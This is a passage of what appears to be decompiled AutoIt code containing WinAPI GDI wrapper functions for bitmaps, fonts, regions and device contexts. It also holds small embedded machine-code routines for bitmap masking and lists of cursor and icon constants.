            Local $acall = DllCall("user32.dll", "lresult", "CallWindowProc", "ptr", __ANDProc(), "ptr", 0x0, "uint", 0x0, "wparam", DllStructGetPtr($atdib[0x0]), "lparam", DllStructGetPtr($atdib[0x1]))
            If @error Then
                $ierror = @error
                ExitLoop
            EndIf
            If Not $acall[0x0] Then
                $ierror = 0xc
                ExitLoop
            EndIf
            $ierror = 0x0
        Until 0x1
        _WinAPI_DeleteObject($hbitmap)
        If $ierror Then
            If $hdib Then
                _WinAPI_DeleteObject($hdib)
            EndIf
            $hdib = 0x0
        EndIf
        Return SetError($ierror, 0x0, $hdib)
    EndFunc    ; -> _WinAPI_CreateANDBitmap

    Func _WinAPI_CreateBitmap($iwidth, $iheight, $iplanes = 0x1, $ibitsperpel = 0x1, $pbits = 0x0)
        Local $acall = DllCall("gdi32.dll", "handle", "CreateBitmap", "int", $iwidth, "int", $iheight, "uint", $iplanes, "uint", $ibitsperpel, "struct*", $pbits)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateBitmap

    Func _WinAPI_CreateCompatibleBitmap($hdc, $iwidth, $iheight)
        Local $acall = DllCall("gdi32.dll", "handle", "CreateCompatibleBitmap", "handle", $hdc, "int", $iwidth, "int", $iheight)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateCompatibleBitmap

    Func _WinAPI_CreateDIB($iwidth, $iheight, $ibitsperpel = 0x20, $tcolortable = 0x0, $icolorcount = 0x0)
        Local $argbq[0x2], $icolors, $tagrgbq
        Switch $ibitsperpel
        Case 0x1
            $icolors = 0x2
        Case 0x4
            $icolors = 0x10
        Case 0x8
            $icolors = 0x100
        Case Else
            $icolors = 0x0
        EndSwitch
        If $icolors Then
            If Not IsDllStruct($tcolortable) Then
                Switch $ibitsperpel
                Case 0x1
                    $argbq[0x0] = 0x0
                    $argbq[0x1] = 0xffffff
                    $tcolortable = _WinAPI_CreateDIBColorTable($argbq)
                Case Else
                EndSwitch
            Else
                If $icolors > $icolorcount Then
                    $icolors = $icolorcount
                EndIf
                If (Not $icolors) Or ((0x4 * $icolors) > DllStructGetSize($tcolortable)) Then
                    Return SetError(0x14, 0x0, 0x0)
                EndIf
            EndIf
            $tagrgbq = ";dword aRGBQuad[" & $icolors & "]"
        Else
            $tagrgbq = ''
        EndIf
        Local $tbitmapinfo = DllStructCreate($TAGBITMAPINFOHEADER & $tagrgbq)
        DllStructSetData($tbitmapinfo, "biSize", 0x28)
        DllStructSetData($tbitmapinfo, "biWidth", $iwidth)
        DllStructSetData($tbitmapinfo, "biHeight", $iheight)
        DllStructSetData($tbitmapinfo, "biPlanes", 0x1)
        DllStructSetData($tbitmapinfo, "biBitCount", $ibitsperpel)
        DllStructSetData($tbitmapinfo, "biCompression", 0x0)
        DllStructSetData($tbitmapinfo, "biSizeImage", 0x0)
        DllStructSetData($tbitmapinfo, "biXPelsPerMeter", 0x0)
        DllStructSetData($tbitmapinfo, "biYPelsPerMeter", 0x0)
        DllStructSetData($tbitmapinfo, "biClrUsed", $icolors)
        DllStructSetData($tbitmapinfo, "biClrImportant", 0x0)
        If $icolors Then
            If IsDllStruct($tcolortable) Then
                _WinAPI_MoveMemory(DllStructGetPtr($tbitmapinfo, "aRGBQuad"), $tcolortable, 0x4 * $icolors)
            Else
                _WinAPI_ZeroMemory(DllStructGetPtr($tbitmapinfo, "aRGBQuad"), 0x4 * $icolors)
            EndIf
        EndIf
        Local $hbitmap = _WinAPI_CreateDIBSection(0x0, $tbitmapinfo, 0x0, $__g_vext)
        If Not $hbitmap Then Return SetError(@error, @extended, 0x0)
        Return $hbitmap
    EndFunc    ; -> _WinAPI_CreateDIB

    Func _WinAPI_CreateDIBSection($hdc, $tbitmapinfo, $iusage, ByRef $pbits, $hsection = 0x0, $ioffset = 0x0)
        $pbits = 0x0
        Local $acall = DllCall("gdi32.dll", "handle", "CreateDIBSection", "handle", $hdc, "struct*", $tbitmapinfo, "uint", $iusage, "ptr*", 0x0, "handle", $hsection, "dword", $ioffset)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        $pbits = $acall[0x4]
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateDIBSection

    Func _WinAPI_CreateDIBColorTable(Const ByRef $ACOLORTABLE, $ISTART = 0x0, $IEND = + -1)
        If __CheckErrorArrayBounds($ACOLORTABLE, $ISTART, $IEND) Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $tcolortable = DllStructCreate("dword[" & ($IEND - $ISTART + 0x1) & "]")
        Local $icount = 0x1
        For $i = $ISTART To $IEND
            DllStructSetData($tcolortable, 0x1, _WinAPI_SwitchColor(__rgb($ACOLORTABLE[$i])), $icount)
            $icount += 0x1
        Next
        Return $tcolortable
    EndFunc    ; -> _WinAPI_CreateDIBColorTable

    Func _WinAPI_CreateFont($iheight, $iwidth, $iescape = 0x0, $iorientn = 0x0, $iweight = $__WINAPICONSTANT_FW_NORMAL, $bitalic = False, $bunderline = False, $bstrikeout = False, $icharset = $__WINAPICONSTANT_DEFAULT_CHARSET, $ioutputprec = $__WINAPICONSTANT_OUT_DEFAULT_PRECIS, $iclipprec = $__WINAPICONSTANT_CLIP_DEFAULT_PRECIS, $iquality = $__WINAPICONSTANT_DEFAULT_QUALITY, $ipitch = 0x0, $sface = "Arial")
        Local $acall = DllCall("gdi32.dll", "handle", "CreateFontW", "int", $iheight, "int", $iwidth, "int", $iescape, "int", $iorientn, "int", $iweight, "dword", $bitalic, "dword", $bunderline, "dword", $bstrikeout, "dword", $icharset, "dword", $ioutputprec, "dword", $iclipprec, "dword", $iquality, "dword", $ipitch, "wstr", $sface)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateFont

    Func _WinAPI_CreateFontIndirect($tlogfont)
        Local $acall = DllCall("gdi32.dll", "handle", "CreateFontIndirectW", "struct*", $tlogfont)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateFontIndirect

    Func _WinAPI_CreateRectRgn($ileftrect, $itoprect, $irightrect, $ibottomrect)
        Local $acall = DllCall("gdi32.dll", "handle", "CreateRectRgn", "int", $ileftrect, "int", $itoprect, "int", $irightrect, "int", $ibottomrect)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateRectRgn

    Func _WinAPI_CreateRoundRectRgn($ileftrect, $itoprect, $irightrect, $ibottomrect, $iwidthellipse, $iheightellipse)
        Local $acall = DllCall("gdi32.dll", "handle", "CreateRoundRectRgn", "int", $ileftrect, "int", $itoprect, "int", $irightrect, "int", $ibottomrect, "int", $iwidthellipse, "int", $iheightellipse)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateRoundRectRgn

    Func _WinAPI_CreateSolidBrush($icolor)
        Local $acall = DllCall("gdi32.dll", "handle", "CreateSolidBrush", "INT", $icolor)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateSolidBrush

    Func _WinAPI_GetBitmapDimension($hbitmap)
        Local $tobj = DllStructCreate($TAGBITMAP)
        Local $acall = DllCall("gdi32.dll", "int", "GetObject", "handle", $hbitmap, "int", DllStructGetSize($tobj), "struct*", $tobj)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return _WinAPI_CreateSize(DllStructGetData($tobj, "bmWidth"), DllStructGetData($tobj, "bmHeight"))
    EndFunc    ; -> _WinAPI_GetBitmapDimension

    Func _WinAPI_GetSysColorBrush($iindex)
        Local $acall = DllCall("user32.dll", "handle", "GetSysColorBrush", "int", $iindex)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetSysColorBrush

    Func _WinAPI_GetTextExtentPoint32($hdc, $stext)
        Local $tsize = DllStructCreate($TAGSIZE)
        Local $isize = StringLen($stext)
        Local $acall = DllCall("gdi32.dll", "bool", "GetTextExtentPoint32W", "handle", $hdc, "wstr", $stext, "int", $isize, "struct*", $tsize)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $tsize
    EndFunc    ; -> _WinAPI_GetTextExtentPoint32

    Func _WinAPI_GetTextMetrics($hdc)
        Local $ttextmetric = DllStructCreate($TAGTEXTMETRIC)
        Local $acall = DllCall("gdi32.dll", "bool", "GetTextMetricsW", "handle", $hdc, "struct*", $ttextmetric)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $ttextmetric
    EndFunc    ; -> _WinAPI_GetTextMetrics

    Func _WinAPI_GetWindowRgn($hwnd, $hrgn)
        Local $acall = DllCall("user32.dll", "int", "GetWindowRgn", "hwnd", $hwnd, "handle", $hrgn)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetWindowRgn

    Func _WinAPI_IsAlphaBitmap($hbitmap)
        $hbitmap = _WinAPI_CopyBitmap($hbitmap)
        If Not $hbitmap Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $acall, $ierror = 0x0
        Do
            Local $tdib = DllStructCreate($TAGDIBSECTION)
            If (Not _WinAPI_GetObject($hbitmap, DllStructGetSize($tdib), $tdib)) Or (DllStructGetData($tdib, "bmBitsPixel") <> 0x20) Or (DllStructGetData($tdib, "biCompression")) Then
                $ierror = 0x1
                ExitLoop
            EndIf
            $acall = DllCall("user32.dll", "int", "CallWindowProc", "ptr", __AlphaProc(), "ptr", 0x0, "uint", 0x0, "struct*", $tdib, "ptr", 0x0)
            If @error Or ($acall[0x0] = + -1) Then
                $ierror = @error + 0xa
                ExitLoop
            EndIf
        Until 0x1
        _WinAPI_DeleteObject($hbitmap)
        If $ierror Then Return SetError($ierror, 0x0, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_IsAlphaBitmap

    Func _WinAPI_PtInRect(ByRef $trect, ByRef $tpoint)
        Local $acall = DllCall("user32.dll", "bool", "PtInRect", "struct*", $trect, "struct", $tpoint)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PtInRect

    Func _WinAPI_RedrawWindow($hwnd, $trect = 0x0, $hregion = 0x0, $iflags = 0x5)
        Local $acall = DllCall("user32.dll", "bool", "RedrawWindow", "hwnd", $hwnd, "struct*", $trect, "handle", $hregion, "uint", $iflags)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_RedrawWindow

    Func _WinAPI_SetWindowRgn($hwnd, $hrgn, $bredraw = True)
        Local $acall = DllCall("user32.dll", "int", "SetWindowRgn", "hwnd", $hwnd, "handle", $hrgn, "bool", $bredraw)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetWindowRgn

#EndRegion Public Functions
#Region Embedded DLL Functions
    Func __AlphaProc()
        Static $pproc = 0x0
        If Not $pproc Then
            If @AutoItX64 Then
                $pproc = __Init(Binary("0x48894C240848895424104C894424184C894C24205541574831C050504883EC28" & "48837C24600074054831C0EB0748C7C0010000004821C0751F488B6C24604883" & "7D180074054831C0EB0748C7C0010000004821C07502EB0948C7C001000000EB" & "034831C04821C0740C48C7C0FFFFFFFF4863C0EB6F48C744242800000000488B" & "6C24604C637D04488B6C2460486345084C0FAFF849C1E7024983C7FC4C3B7C24" & "287C36488B6C24604C8B7D184C037C24284983C7034C897C2430488B6C243080" & "7D0000740C48C7C0010000004863C0EB1348834424280471A54831C04863C0EB" & "034831C04883C438415F5DC3"))
            Else
                $pproc = __Init(Binary("0x555331C05050837C241C00740431C0EB05B80100000021C075198B6C241C837D" & "1400740431C0EB05B80100000021C07502EB07B801000000EB0231C021C07407" & "B8FFFFFFFFEB4FC70424000000008B6C241C8B5D048B6C241C0FAF5D08C1E302" & "83C3FC3B1C247C288B6C241C8B5D14031C2483C303895C24048B6C2404807D00" & "007407B801000000EB0C8304240471BE31C0EB0231C083C4085B5DC21000"))
            EndIf
        EndIf
        Return $pproc
    EndFunc    ; -> __AlphaProc

    Func __ANDProc()
        Static $pproc = 0x0
        If Not $pproc Then
            If @AutoItX64 Then
                $pproc = __Init(Binary("0x48894C240848895424104C894424184C894C2420554157415648C7C009000000" & "4883EC0848C704240000000048FFC875EF4883EC284883BC24A0000000007405" & "4831C0EB0748C7C0010000004821C00F85840000004883BC24A8000000007405" & "4831C0EB0748C7C0010000004821C07555488BAC24A000000048837D18007405" & "4831C0EB0748C7C0010000004821C07522488BAC24A800000048837D18007405" & "4831C0EB0748C7C0010000004821C07502EB0948C7C001000000EB034831C048" & "21C07502EB0948C7C001000000EB034831C04821C07502EB0948C7C001000000" & "EB034831C04821C0740B4831C04863C0E9D701000048C74424280000000048C7" & "44243000000000488BAC24A00000004C637D0849FFCF4C3B7C24300F8C9C0100" & "0048C74424380000000048C74424400000000048C744244800000000488BAC24" & "A00000004C637D0449FFCF4C3B7C24480F8CDB000000488BAC24A00000004C8B" & "7D184C037C24284983C7034C897C2450488B6C2450807D000074264C8B7C2440" & "4C8B74243849F7DE4983C61F4C89F148C7C00100000048D3E04909C74C897C24" & "4048FF4424384C8B7C24384983FF1F7E6F4C8B7C244049F7D74C897C244048C7" & "442458180000004831C0483B4424587F3D488BAC24A80000004C8B7D184C037C" & "24604C897C24504C8B7C2440488B4C245849D3FF4C89F850488B6C2458588845" & "0048FF4424604883442458F871B948C74424380000000048C744244000000000" & "48834424280448FF4424480F810BFFFFFF48837C24380074794C8B7C244049F7" & "D74C8B74243849F7DE4983C6204C89F148C7C0FFFFFFFF48D3E04921C74C897C" & "244048C7442458180000004831C0483B4424587F3D488BAC24A80000004C8B7D" & "184C037C24604C897C24504C8B7C2440488B4C245849D3FF4C89F850488B6C24" & "585888450048FF4424604883442458F871B948FF4424300F814AFEFFFF48C7C0" & "010000004863C0EB034831C04883C470415E415F5DC3"))
            Else
                $pproc = __Init(Binary("0x555357BA0800000083EC04C70424000000004A75F3837C243800740431C0EB05" & "B80100000021C07562837C243C00740431C0EB05B80100000021C0753F8B6C24" & "38837D1400740431C0EB05B80100000021C075198B6C243C837D1400740431C0" & "EB05B80100000021C07502EB07B801000000EB0231C021C07502EB07B8010000" & "00EB0231C021C07502EB07B801000000EB0231C021C0740731C0E969010000C7" & "042400000000C7442404000000008B6C24388B5D084B3B5C24040F8C3F010000" & "C744240800000000C744240C00000000C7442410000000008B6C24388B5D044B" & "3B5C24100F8CA90000008B6C24388B5D14031C2483C303895C24148B6C241480" & "7D0000741C8B5C240C8B7C2408F7DF83C71F89F9B801000000D3E009C3895C24" & "0CFF4424088B5C240883FB1F7E578B5C240CF7D3895C240CC744241818000000" & "31C03B4424187F2D8B6C243C8B5D14035C241C895C24148B5C240C8B4C2418D3" & "FB538B6C241858884500FF44241C83442418F871CBC744240800000000C74424" & "0C0000000083042404FF4424100F8145FFFFFF837C240800745B8B5C240CF7D3" & "8B7C2408F7DF83C72089F9B8FFFFFFFFD3E021C3895C240CC744241818000000" & "31C03B4424187F2D8B6C243C8B5D14035C241C895C24148B5C240C8B4C2418D3" & "FB538B6C241858884500FF44241C83442418F871CBFF4424040F81AFFEFFFFB8" & "01000000EB0231C083C4205F5B5DC21000"))
            EndIf
        EndIf
        Return $pproc
    EndFunc    ; -> __ANDProc

    Func __XORProc()
        Static $pproc = 0x0
        If Not $pproc Then
            If @AutoItX64 Then
                $pproc = __Init(Binary("0x48894C240848895424104C894424184C894C24205541574831C050504883EC28" & "48837C24600074054831C0EB0748C7C0010000004821C0751B48837C24680074" & "054831C0EB0748C7C0010000004821C07502EB0948C7C001000000EB034831C0" & "4821C074084831C04863C0EB7748C7442428000000004C637C24584983C7FC4C" & "3B7C24287C4F4C8B7C24604C037C24284C897C2430488B6C2430807D00007405" & "4831C0EB0748C7C0010000004821C0741C4C8B7C24684C037C24284983C7034C" & "897C2430488B6C2430C64500FF48834424280471A148C7C0010000004863C0EB" & "034831C04883C438415F5DC3"))
            Else
                $pproc = __Init(Binary("0x555331C05050837C241C00740431C0EB05B80100000021C07516837C24200074" & "0431C0EB05B80100000021C07502EB07B801000000EB0231C021C0740431C0EB" & "5AC70424000000008B5C241883C3FC3B1C247C3E8B5C241C031C24895C24048B" & "6C2404807D0000740431C0EB05B80100000021C074168B5C2420031C2483C303" & "895C24048B6C2404C64500FF8304240471B6B801000000EB0231C083C4085B5D" & "C21000"))
            EndIf
        EndIf
        Return $pproc
    EndFunc    ; -> __XORProc

#EndRegion Embedded DLL Functions
#Region Internal Functions
    Func __Init($ddata)
        Local $ilength = BinaryLen($ddata)
        Local $acall = DllCall("kernel32.dll", "ptr", "VirtualAlloc", "ptr", 0x0, "ulong_ptr", $ilength, "dword", 0x1000, "dword", 0x40)
        If @error Or Not $acall[0x0] Then __FatalExit(0x1, "Error allocating memory.")
        Local $tdata = DllStructCreate("byte[" & $ilength & "]", $acall[0x0])
        DllStructSetData($tdata, 0x1, $ddata)
        Return $acall[0x0]
    EndFunc    ; -> __Init

#EndRegion Internal Functions
#Region Global Variables and Constants
    Global Const $DI_MASK = 0x1
    Global Const $DI_IMAGE = 0x2
    Global Const $DI_NORMAL = 0x3
    Global Const $DI_COMPAT = 0x4
    Global Const $DI_DEFAULTSIZE = 0x8
    Global Const $DI_NOMIRROR = 0x10
    Global Const $DISPLAY_DEVICE_ATTACHED_TO_DESKTOP = 0x1
    Global Const $DISPLAY_DEVICE_MULTI_DRIVER = 0x2
    Global Const $DISPLAY_DEVICE_PRIMARY_DEVICE = 0x4
    Global Const $DISPLAY_DEVICE_MIRRORING_DRIVER = 0x8
    Global Const $DISPLAY_DEVICE_VGA_COMPATIBLE = 0x10
    Global Const $DISPLAY_DEVICE_REMOVABLE = 0x20
    Global Const $DISPLAY_DEVICE_DISCONNECT = 0x2000000
    Global Const $DISPLAY_DEVICE_REMOTE = 0x4000000
    Global Const $DISPLAY_DEVICE_MODESPRUNED = 0x8000000
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions
    Func _WinAPI_CreateCompatibleDC($hdc)
        Local $acall = DllCall("gdi32.dll", "handle", "CreateCompatibleDC", "handle", $hdc)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateCompatibleDC

    Func _WinAPI_DeleteDC($hdc)
        Local $acall = DllCall("gdi32.dll", "bool", "DeleteDC", "handle", $hdc)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_DeleteDC

    Func _WinAPI_DrawEdge($hdc, $trect, $iedgetype, $iflags)
        Local $acall = DllCall("user32.dll", "bool", "DrawEdge", "handle", $hdc, "struct*", $trect, "uint", $iedgetype, "uint", $iflags)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_DrawEdge

    Func _WinAPI_DrawFrameControl($hdc, $trect, $itype, $istate)
        Local $acall = DllCall("user32.dll", "bool", "DrawFrameControl", "handle", $hdc, "struct*", $trect, "uint", $itype, "uint", $istate)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_DrawFrameControl

    Func _WinAPI_DrawIcon($hdc, $ix, $iy, $hicon)
        Local $acall = DllCall("user32.dll", "bool", "DrawIcon", "handle", $hdc, "int", $ix, "int", $iy, "handle", $hicon)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_DrawIcon

    Func _WinAPI_DrawIconEx($hdc, $ix, $iy, $hicon, $iwidth = 0x0, $iheight = 0x0, $istep = 0x0, $hbrush = 0x0, $iflags = 0x3)
        Local $ioptions
        Switch $iflags
        Case 0x1
            $ioptions = $DI_MASK
        Case 0x2
            $ioptions = $DI_IMAGE
        Case 0x3
            $ioptions = $DI_NORMAL
        Case 0x4
            $ioptions = $DI_COMPAT
        Case 0x5
            $ioptions = $DI_DEFAULTSIZE
        Case Else
            $ioptions = $DI_NOMIRROR
        EndSwitch
        Local $acall = DllCall("user32.dll", "bool", "DrawIconEx", "handle", $hdc, "int", $ix, "int", $iy, "handle", $hicon, "int", $iwidth, "int", $iheight, "uint", $istep, "handle", $hbrush, "uint", $ioptions)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_DrawIconEx

    Func _WinAPI_DrawText($hdc, $stext, ByRef $trect, $iflags)
        Local $acall = DllCall("user32.dll", "int", "DrawTextW", "handle", $hdc, "wstr", $stext, "int", + -1, "struct*", $trect, "uint", $iflags)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_DrawText

    Func _WinAPI_EnumDisplayDevices($sdevice, $IDEVNUM)
        Local $tname = 0x0, $iflags = 0x0, $adevice[0x5]
        If $sdevice <> '' Then
            $tname = DllStructCreate("wchar Text[" & StringLen($sdevice) + 0x1 & "]")
            DllStructSetData($tname, "Text", $sdevice)
        EndIf
        Local Const $TAGDISPLAY_DEVICE = "dword Size;wchar Name[32];wchar String[128];dword Flags;wchar ID[128];wchar Key[128]"
        Local $tdevice = DllStructCreate($TAGDISPLAY_DEVICE)
        Local $idevice = DllStructGetSize($tdevice)
        DllStructSetData($tdevice, "Size", $idevice)
        Local $acall = DllCall("user32.dll", "bool", "EnumDisplayDevicesW", "struct*", $tname, "dword", $IDEVNUM, "struct*", $tdevice, "dword", 0x1)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $in = DllStructGetData($tdevice, "Flags")
        If BitAND($in, $DISPLAY_DEVICE_ATTACHED_TO_DESKTOP) <> 0x0 Then $iflags = BitOR($iflags, 0x1)
        If BitAND($in, $DISPLAY_DEVICE_PRIMARY_DEVICE) <> 0x0 Then $iflags = BitOR($iflags, 0x2)
        If BitAND($in, $DISPLAY_DEVICE_MIRRORING_DRIVER) <> 0x0 Then $iflags = BitOR($iflags, 0x4)
        If BitAND($in, $DISPLAY_DEVICE_VGA_COMPATIBLE) <> 0x0 Then $iflags = BitOR($iflags, 0x8)
        If BitAND($in, $DISPLAY_DEVICE_REMOVABLE) <> 0x0 Then $iflags = BitOR($iflags, 0x10)
        If BitAND($in, $DISPLAY_DEVICE_MODESPRUNED) <> 0x0 Then $iflags = BitOR($iflags, 0x20)
        $adevice[0x0] = True
        $adevice[0x1] = DllStructGetData($tdevice, "Name")
        $adevice[0x2] = DllStructGetData($tdevice, "String")
        $adevice[0x3] = $iflags
        $adevice[0x4] = DllStructGetData($tdevice, "ID")
        Return $adevice
    EndFunc    ; -> _WinAPI_EnumDisplayDevices

    Func _WinAPI_FillRect($hdc, $trect, $hbrush)
        Local $acall
        If IsPtr($hbrush) Then
            $acall = DllCall("user32.dll", "int", "FillRect", "handle", $hdc, "struct*", $trect, "handle", $hbrush)
        Else
            $acall = DllCall("user32.dll", "int", "FillRect", "handle", $hdc, "struct*", $trect, "dword_ptr", $hbrush)
        EndIf
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FillRect

    Func _WinAPI_FrameRect($hdc, $trect, $hbrush)
        Local $acall = DllCall("user32.dll", "int", "FrameRect", "handle", $hdc, "struct*", $trect, "handle", $hbrush)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FrameRect

    Func _WinAPI_GetBkMode($hdc)
        Local $acall = DllCall("gdi32.dll", "int", "GetBkMode", "handle", $hdc)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetBkMode

    Func _WinAPI_GetDC($hwnd)
        Local $acall = DllCall("user32.dll", "handle", "GetDC", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetDC

    Func _WinAPI_GetDCEx($hwnd, $hrgn, $iflags)
        Local $acall = DllCall("user32.dll", "handle", "GetDCEx", "hwnd", $hwnd, "handle", $hrgn, "dword", $iflags)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetDCEx

    Func _WinAPI_GetDeviceCaps($hdc, $iindex)
        Local $acall = DllCall("gdi32.dll", "int", "GetDeviceCaps", "handle", $hdc, "int", $iindex)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetDeviceCaps

    Func _WinAPI_GetTextColor($hdc)
        Local $acall = DllCall("gdi32.dll", "dword", "GetTextColor", "handle", $hdc)
        If @error Or ($acall[0x0] = -1) Then Return SetError(@error, @extended, + -1)
        Return __rgb($acall[0x0])
    EndFunc    ; -> _WinAPI_GetTextColor

    Func _WinAPI_GetWindowDC($hwnd)
        Local $acall = DllCall("user32.dll", "handle", "GetWindowDC", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetWindowDC

    Func _WinAPI_PrintWindow($hwnd, $hdc, $bclient = False)
        Local $acall = DllCall("user32.dll", "bool", "PrintWindow", "hwnd", $hwnd, "handle", $hdc, "uint", $bclient)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PrintWindow

    Func _WinAPI_ReleaseDC($hwnd, $hdc)
        Local $acall = DllCall("user32.dll", "int", "ReleaseDC", "hwnd", $hwnd, "handle", $hdc)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ReleaseDC

    Func _WinAPI_RestoreDC($hdc, $iid)
        Local $acall = DllCall("gdi32.dll", "bool", "RestoreDC", "handle", $hdc, "int", $iid)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_RestoreDC

    Func _WinAPI_SaveDC($hdc)
        Local $acall = DllCall("gdi32.dll", "int", "SaveDC", "handle", $hdc)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SaveDC

    Func _WinAPI_SetBkColor($hdc, $icolor)
        Local $acall = DllCall("gdi32.dll", "INT", "SetBkColor", "handle", $hdc, "INT", $icolor)
        If @error Then Return SetError(@error, @extended, + -1)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetBkColor

    Func _WinAPI_SetBkMode($hdc, $ibkmode)
        Local $acall = DllCall("gdi32.dll", "int", "SetBkMode", "handle", $hdc, "int", $ibkmode)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetBkMode

    Func _WinAPI_SetTextColor($hdc, $icolor)
        Local $acall = DllCall("gdi32.dll", "INT", "SetTextColor", "handle", $hdc, "INT", $icolor)
        If @error Then Return SetError(@error, @extended, + -1)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetTextColor

    Func _WinAPI_TwipsPerPixelX()
        Local $hdc, $itwipsperpixelx
        $hdc = _WinAPI_GetDC(0x0)
        Local Const $__WINAPICONSTANT_LOGPIXELSX = 0x58
        $itwipsperpixelx = 0x5a0 / _WinAPI_GetDeviceCaps($hdc, $__WINAPICONSTANT_LOGPIXELSX)
        _WinAPI_ReleaseDC(0x0, $hdc)
        Return $itwipsperpixelx
    EndFunc    ; -> _WinAPI_TwipsPerPixelX

    Func _WinAPI_TwipsPerPixelY()
        Local $hdc, $itwipsperpixely
        $hdc = _WinAPI_GetDC(0x0)
        Local Const $__WINAPICONSTANT_LOGPIXELSY = 0x5a
        $itwipsperpixely = 0x5a0 / _WinAPI_GetDeviceCaps($hdc, $__WINAPICONSTANT_LOGPIXELSY)
        _WinAPI_ReleaseDC(0x0, $hdc)
        Return $itwipsperpixely
    EndFunc    ; -> _WinAPI_TwipsPerPixelY

#EndRegion Public Functions
#Region Internal Functions
#EndRegion Internal Functions
#Region Global Variables and Constants
    Global Const $IDC_UNKNOWN = 0x0
    Global Const $IDC_APPSTARTING = 0x7f8a
    Global Const $IDC_ARROW = 0x7f00
    Global Const $IDC_CROSS = 0x7f03
    Global Const $IDC_HAND = 0x7f89
    Global Const $IDC_HELP = 0x7f8b
    Global Const $IDC_IBEAM = 0x7f01
    Global Const $IDC_NO = 0x7f88
    Global Const $IDC_SIZEALL = 0x7f86
    Global Const $IDC_SIZENESW = 0x7f83
    Global Const $IDC_SIZENS = 0x7f85
    Global Const $IDC_SIZENWSE = 0x7f82
    Global Const $IDC_SIZEWE = 0x7f84
    Global Const $IDC_UPARROW = 0x7f04
    Global Const $IDC_WAIT = 0x7f02
    Global Const $IDI_APPLICATION = 0x7f00
    Global Const $IDI_ASTERISK = 0x7f04
    Global Const $IDI_EXCLAMATION = 0x7f03
    Global Const $IDI_HAND = 0x7f01
    Global Const $IDI_QUESTION = 0x7f02
    Global Const $IDI_WINLOGO = 0x7f05
    Global Const $IDI_SHIELD = 0x7f06
    Global Const $IDI_ERROR = $IDI_HAND
    Global Const $IDI_INFORMATION = $IDI_ASTERISK
    Global Const $IDI_WARNING = $IDI_EXCLAMATION
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions
    Global Const $TAGICONINFO = "bool Icon;dword XHotSpot;dword YHotSpot;handle hMask;handle hColor"
    Func _WinAPI_AddIconTransparency($hicon, $ipercent = 0x32, $bdelete = False)
